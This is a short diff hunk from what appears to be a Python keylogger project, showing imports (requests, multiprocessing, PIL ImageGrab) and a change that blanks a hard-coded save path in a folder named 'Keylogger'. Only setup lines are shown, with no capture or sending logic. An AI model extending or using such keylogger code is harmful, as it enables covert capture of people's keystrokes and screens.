@@ -27,7 +27,7 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-file_path = "C:\\Users\\Abhilash Banerjee\\Desktop\\Keylogger\\Key" # Enter the file path you want your files to be saved to
+file_path = "" # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
 
